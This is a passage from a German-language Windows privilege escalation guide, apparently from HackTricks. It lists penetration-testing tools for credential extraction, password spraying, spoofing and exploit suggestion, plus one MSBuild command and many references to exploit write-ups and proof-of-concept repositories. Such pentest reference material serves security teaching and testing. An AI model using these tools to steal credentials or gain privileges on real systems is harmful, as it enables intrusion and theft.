[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Password Spray mit gesammelten Passwörtern über die gesamte Domain aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofing- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung für Privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Privesc-Schwachstellen (VERALTET, stattdessen Watson verwenden)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Untersucht den Host auf Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für Privesc) (muss kompiliert werden) **(**[**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt accesschk nicht, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden Version von .NET kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Opfer-Host installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Erhöhen von Berechtigungen durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Umfassender OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste für Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Windows Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Anmeldedaten → Veeam CVE-2023-27532 bis SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc-ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel in den Kernel-Schatten](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit. Missbrauch von Symbolic Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++-Checklistenaufgaben, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funktion RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verketten von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Missbrauch beliebiger Dateilöschungen für Privilege Escalation und weitere Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Erkundung von Credential Manager und Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extrahieren privater SSH-Schlüssel aus dem SSH-Agent von Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation durch Löschen des Microsoft Windows Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
